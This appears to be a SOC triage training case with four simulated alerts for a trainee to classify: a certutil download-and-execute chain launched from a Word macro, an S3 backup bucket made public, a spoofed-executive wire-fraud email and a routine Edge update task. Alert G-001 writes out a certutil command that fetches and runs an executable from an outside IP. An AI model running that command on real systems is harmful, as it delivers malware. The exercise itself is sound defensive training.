# Case_027 — Mixed Queue: LOLBin Delivery, Public S3 Exposure, Spoofed-Executive Email, Routine Scheduled Task

**Phase:** 4 (Cases 21–30) — Mixed multi-domain queue, 4-alert batch
**Format:** Mixed — EDR, AWS GuardDuty/Config, Microsoft Defender for O365, Windows Security
**Splunk verified:** No — ticket-only (analyst decision, alternating with Case_026)

---

## Alerts (as received at trigger time)

```
Alert G-001 — Endpoint: Suspicious LOLBin Chain
  Severity: Medium
  Host: MFL-WKS0472
  User: t.bhatt
  Detail: certutil.exe -urlcache -split -f hxxp://185.44.12.9/upd.exe C:\Users\Public\upd.exe
          followed 8 seconds later by execution of upd.exe
  Parent process: cmd.exe ← winword.exe (spawned from a macro-enabled attachment
                  opened 40 seconds earlier)

Alert G-002 — AWS: S3 Bucket Policy Made Public
  Severity: High
  Account ID: 559102847763
  Bucket: aurora-backups-prod
  Actor: IAMUser: automation-ci-deploy
  Detail: PutBucketPolicy changed bucket ACL from private to public-read;
          bucket contains database backup files (.sql.gz, .bak)
  Actor's typical activity: routine CI/CD deployment actions only, no prior
  history of ACL/policy changes in 120-day CloudTrail history

Alert G-003 — Email: Inbound from Spoofed Executive Domain
  Severity: Medium
  Sender: ceo@aurora-resorts.co (note: legitimate domain is aurora-resorts.com)
  Recipient: finance-team@auroraresorts.com (distribution list, 6 members)
  Subject: "Confidential - wire transfer authorization needed today"
  SPF/DKIM/DMARC: Fail/Fail/Fail
  Link/attachment: None — plain text body only
  Recipient action: No replies logged, no forwards logged

Alert G-004 — Endpoint: Scheduled Task, Off-Hours Creation
  Severity: Low
  Host: MFL-FIN02
  User: SYSTEM
  Task Name: "MicrosoftEdgeUpdateTaskMachineCore"
  Action: Runs Microsoft Edge updater executable, signed Microsoft binary
  Time: 03:14 UTC (matches standard Edge auto-update schedule for this task name)
```

## Task

TP / FP / Ambiguous for G-001 through G-004. These are independent alerts unless evidence links
them — don't assume correlation just because they arrived in the same queue.
